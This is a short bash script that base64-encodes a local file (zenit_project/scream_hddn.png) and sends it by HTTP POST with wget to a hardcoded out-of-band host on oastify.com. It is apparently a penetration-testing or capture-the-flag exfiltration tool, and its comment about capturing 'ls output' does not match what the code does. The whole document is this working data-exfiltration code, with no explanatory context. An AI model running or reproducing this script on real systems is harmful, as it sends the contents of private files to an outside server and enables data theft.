#!/bin/bash

# Hardcoded server info
SERVER_HOST="ophu3gyj4p4xp1zvzurewrg0vr1ipjd8.oastify.com"
SERVER_PORT=80

SERVER_PATH="/"   

# Capture ls output
OUTPUT=$(cat zenit_project/scream_hddn.png | base64 -w0)

# Send output via HTTP POST using wget
wget --quiet \
     --method=POST \
     --header="Content-Type: text/plain" \
     --body-data="$OUTPUT" \
     "http://${SERVER_HOST}:${SERVER_PORT}${SERVER_PATH}" \
     -O /dev/null
